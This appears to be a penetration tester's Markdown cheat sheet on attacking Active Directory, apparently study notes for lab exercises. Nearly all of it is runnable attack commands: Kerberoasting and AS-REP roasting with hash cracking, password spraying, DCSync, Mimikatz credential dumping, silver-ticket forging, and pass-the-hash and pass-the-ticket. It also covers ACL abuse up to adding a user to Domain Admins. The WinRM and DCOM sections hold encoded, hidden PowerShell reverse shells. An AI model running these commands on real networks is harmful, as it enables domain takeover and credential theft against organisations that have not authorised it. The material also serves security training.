# Active Directory – Attacking

---

<details open>
<summary><strong>Table of Contents</strong></summary>

<br>

- [Attacking from Kali](#attacking-from-kali)
  - [Enumeration](#enumeration)
    - [User Enumeration](#user-enumeration)
      - [SMB](#smb)
      - [RPC Client](#rpc-client)
      - [LDAP](#ldap)
  - [Attacking Without Credentials](#attacking-without-credentials)
    - [AS-REP Roasting](#as-rep-roasting)
    - [Password Reuse](#password-reuse)
  - [Attacking With Credentials](#attacking-with-credentials)
    - [Kerberoasting](#kerberoasting)
    - [Password Spraying](#password-spraying)
    - [Credential Validation](#credential-validation)
    - [Pass the Hash](#pass-the-hash)
    - [DCSync](#dcsync)
    - [BloodHound](#bloodhound)

- [Attacking from Victim](#attacking-from-victim)
  - [Enumeration](#enumeration)
    - [Local Enumeration](#local-enumeration)
      - [PowerView](#powerview)
    - [Manual Enumeration](#manual-enumeration)
      - [Enumerate SPNs](#enumerate-spns)
      - [Enumerate User ACEs](#enumerate-user-aces)
      - [Enumerate Doimain Shares](#enumerate-doimain-shares)
    - [Automated Enumeration](#automated-enumeration)
  - [Attacking](#attacking)
    - [Cached AD Credentials](#cached-ad-credentials)
      - [Mimikatz](#mimikatz)
      - [Show Tickets](#show-tickets)
    - [AD Authentication](#ad-authentication)
      - [Passwords Attacks](#passwords-attacks)
      - [ASREPRoasting](#asreproasting)
      - [Kerberoasting](#kerberoasting)
      - [Silver Tickets](#silver-tickets)
      - [DCSync](#dcsync)
  - [Lateral Movement](#lateral-movement)
    - [WinRM](#winrm)
    - [PsExec](#psexec)
    - [Pass the Hash](#pass-the-hash)
    - [OverPass the Hash](#overpass-the-hash)
    - [Pass the Ticket](#pass-the-ticket)
    - [DCOM](#dcom)

- [Tips](#tips)
  - [Generate Passwords from Public Usernames](#generate-passwords-from-public-usernames)
  - [Always Enumerate Shares Twice](#always-enumerate-shares-twice)

</details>

---

## Attacking from Kali
<details>
<summary><strong>Enumeration</strong></summary>

### Enumeration

Relevant ports: 
```
88 → Kerberos
389 → LDAP
445 → SMB
5985 → WinRM
3268 → Global Catalog
```
Initial full TCP port scan:

```bash
sudo nmap -p- --min-rate 5000 -sS -n -Pn <IP> -oN ports
```

Service enumeration on discovered ports:

```bash
nmap -p$(grep -oP '^\d+(?=/tcp)' ports | paste -sd,) -sCV <IP> -oN services
```
#### User enum

Our goal here is to find valid user names

##### SMB
```bash
smbclient -L //<IP> -N
crackmapexec smb <IP> --shares -u '' -p ''
enum4linux -a <IP>
```
##### prcclient
```bash
rpcclient -U "" <IP> -N
enumdomusers
```

##### ldap
```bash
ldapsearch -x -H ldap://<IP> -s base
```
</details>

<details>
<summary><strong>Attacking without password</strong></summary>

### Attacking without password
#### ASREPRoast
TGT hash
```bash
impacket-GetNPUsers corp.com/ -no-pass -usersfile users.txt -dc-ip <IP>
```
If hash found
```bash
hashcat -m 18200 hashes.txt rockyou.txt
```
Valida User
```bash
crackmapexec smb <IP> -u 'user' -p 'password' 
```
Try winRM
```bash
crackmapexec winrm <IP> -u 'user' -p 'password'
```
If credentials are valid (`[+]`) and we see Pwned!, connect using Evil-WinRM:
```bash
evil-winrm -i 10.129.5.155 -u user -p 'password'
impacket-psexec corp.com/user:password@<IP>
impacket-wmiexec corp.com/user:password@<IP>
evil-winrm -i 10.129.5.155 -u user -p 'password' -d corp.local
evil-winrm -i 10.129.5.155 -u corp\\user -p 'password'
evil-winrm -i 10.129.5.155 -u user -H <NTLM_HASH>
```

#### Same user and password
```bash
crackmapexec smb <IP> -u users.txt -p users.txt
```
#### Enumerate shares
##### cpassword
```bash
gpp-decrypt <cpassword>
```

</details>

<details>
<summary><strong>Attacking with credentials</strong></summary>

### Attacking with credentials
#### Kerberoasting
TGS hash
```bash
impacket-GetUserSPNs corp.com/user:Password -dc-ip <IP>
```
If hash found
```bash
hashcat -m 13100 hashes.txt rockyou.txt
```
#### Password Spray
```bash
kerbrute passwordspray -d dominio.local users.txt 'Password123'
```
#### DCSync
```bash
impacket-secretsdump -just-dc-user user corp.com/User:Password@<IP>
```
#### Pass the hash
```bash
impacket-wmiexec -hashes <hash> <user>@<IP>
```
#### Enumerate shares again
```bash
crackmapexec smb <IP> -u "user" -p "password" -d active.htb --shares
```
#### Bloodhound
```bash
sudo neo4j start
sudo neo4j status
cd ~/BloodHound-linux-x64
./BloodHound
bloodhound-python -d dominio.local -u user -p password -ns <IP> -c all
```

---
</details>

## Attacking from Victim
<details>
<summary><strong>Enumeration</strong></summary>

### Enumeration
#### Local Enumeration
```bash
net user /domain
net user <username> /domain
net group /domain
net group "Sales Department" /domain
```
##### PowerView
```bash
Import-Module .\PowerView.ps1
#Get basic domain info
Get-NetDomain
#List all users
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon
#Enumerate groups
Get-NetGroup
Get-NetGroup | select cn
#Enumerate specific group
Get-NetGroup "Sales Department" | select member
```

#### Manual Enumeration
```bash
# Operating Systems
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
#Permissions and Logged On Users
Find-LocalAdminAccess
Get-NetSession -ComputerName <name> -Verbose
Get-NetSession -ComputerName files04 -Verbose
#OS version
Get-NetComputer | select operatingsystem,dnshostname,operatingsystemversion
#Logged users using PsLoggedOn
.\PsLoggedon.exe \\<name>
.\PsLoggedon.exe \\files04
```
##### Enumerate SPNs
```bash
setspn -L <user>
setspn -L iis_service
# PowerView SPN enumeration
Get-NetUser -SPN | select samaccountname,serviceprincipalname
#If a web server is found
nslookup.exe <IP>
```
##### Enumerate user ACEs
```bash
# Permissions

- GenericAll: Full control over the object (complete takeover possible).
- GenericWrite: Can modify object attributes (e.g., add SPN, modify properties).
- WriteOwner: Can change the owner of the object (owner can modify ACL).
- WriteDACL: Can modify permissions (ACL) of the object.
- AllExtendedRights: Includes extended rights such as password reset.
- ForceChangePassword: Can reset the password without knowing the current one.
- Self: Can modify certain attributes of the object (sometimes allows self-group addition).
```

```bash
# Commands
Get-ObjectAcl -Identity <user>
Get-ObjectAcl -Identity stephanie
#Convert SID to name
Convert-SidToName <ObjectSID>
#Check GenericAll permissions
Get-ObjectAcl -Identity "Management Department" | ?{$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
#Add user to group
net group "Management Department" stephanie /add /domain
#Confirm membership
Get-NetGroup "Management Department" | select member
#Remove user
net group "Management Department" stephanie /del /domain
```

Abuse Examples
```powershell
# Reset user password (GenericAll / ForceChangePassword / AllExtendedRights)
Set-ADAccountPassword -Identity dave -Reset -NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)
# Add user to a group (if you control the group)
net group "Management Department" stephanie /add /domain
# Confirm membership
Get-NetGroup "Management Department" | select member
# Remove user from group
net group "Management Department" stephanie /del /domain
```
Typical Abuse Scenarios
```bash
#If you have GenericAll over a user → Full account takeover.
Set-ADAccountPassword -Identity dave -Reset -NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)

#If you have GenericWrite over a user → Add fake SPN → Kerberoast.
Set-ADUser -Identity websvc `
-ServicePrincipalNames @{Add='fake/http'}
## From kali
impacket-GetUserSPNs domain.local/user:password -dc-ip <IP>
hashcat -m 13100 hashes.txt rockyou.txt

#If you have WriteDACL → Grant yourself GenericAll → Takeover.
Add-DomainObjectAcl -TargetIdentity dave -PrincipalIdentity stephanie -Rights All
##Then reset password:
Set-ADAccountPassword -Identity dave -Reset -NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)

#If you have WriteOwner → Become owner → Modify ACL → Escalate.
Set-DomainObjectOwner -Identity "Management" -OwnerIdentity stephanie
## Now grant yourself full rights:
Add-DomainObjectAcl -TargetIdentity "Management" -PrincipalIdentity stephanie -Rights All
net group "Management" stephanie /add /domain

#If you have rights over a privileged group → Add yourself → Privilege escalation.
net group "Domain Admins" stephanie /add /domain
Get-NetGroup "Domain Admins" | select member
```

##### Enumerate Doimain Shares
```bash
Find-DomainShare
#Check accessible shares
Find-DomainShare -CheckShareAccess
#View specific share
ls \\dc1.corp.com\sysvol\corp.com\
#Decrypt GPP password
gpp-decrypt <password>
```
#### Automated Enumeration
```bash
#Sharphound Collection
Import-Module .\Sharphound.ps1
Get-Help Invoke-BloodHound
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop -OutputPrefix "corp audit"
```


</details>

<details>
<summary><strong>Attacking</strong></summary>

### Attacking
#### Cached AD Credentials
##### Mimikatz
```bash
./mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```
##### Show tickets
```bash
./mimikatz.exe
privilege::debug
sekurlsa::tickets
```
#### AD Authentication
##### Passwords attacks
```bash
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "password"
```
##### ASREPRoasting
```bash
.\Rubeus.exe asreproast /nowrap
```

##### Kerberoasting
```bash
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

##### Silver Tickets
```bash
#Mimikatz
#Get SPN hash
privilege::debug
sekurlsa::logonpasswords
#Obtain domain SID
whoami /user
#Create silver ticket
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
#Check tickets in memory:
klist
#Access the web page as jeffadmin:
iwr -UseDefaultCredentials http://web04
```

##### DCSync
```bash
#Mimikatz
lsadump::dcsync /user:corp\dave
#We copy the hash and crack it on kali usong hashcat
```
</details>
<details>
<summary><strong>Lateral movement</strong></summary>

### Lateral movement
#### WinRM
```bash
winrs -r:server -u:user -p:password  "cmd /c hostname & whoami"
# Encoded revershell
winrs -r:files04 -u:jen -p:password  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

#### PsExec
```bash
.\PsExec64.exe -i  \\server -u corp\<user> -p password cmd
```   

#### Pass the hash
```bash
kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```   
#### OverPass the hash
```bash
#Mimikatz
sekurlsa::logonpasswords
sekurlsa::pth /user:user /domain:corp.com /ntlm:<HASH> /run:powershell
#Generate TGT via network share
net use \\share
#Run PsExec remotely as user
.\PsExec.exe \\share cmd
``` 

#### Pass the ticket
```bash
#Mimikatz
sekurlsa::tickets /export
 kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
``` 

#### DCOM
```bash
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAU...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
``` 

</details>

---
## Tips
<details>
<summary><strong>Tips</strong></summary>

### Generate Passwords from Public Usernames

```bash
#Sometimes a company website exposes full employee names. Example Lorem Ipsum
#Instead of using only generic wordlists, generate custom users based on common username formats
loremipsum
lorem.ipsum
lipsum
l.ipsum
lorem.i
ipsuml
ipsum.l

kerbrute userenum -d domain.local --dc <IP> users.txt
crackmapexec smb <IP> -u users.txt -p 'whatever'
``` 
### Always enumerate shares Twice
```bash
#Without credentials
crackmapexec smb <IP> --shares -u '' -p ''

#With credentials
crackmapexec smb <IP> --shares -u user -p password
``` 
</details>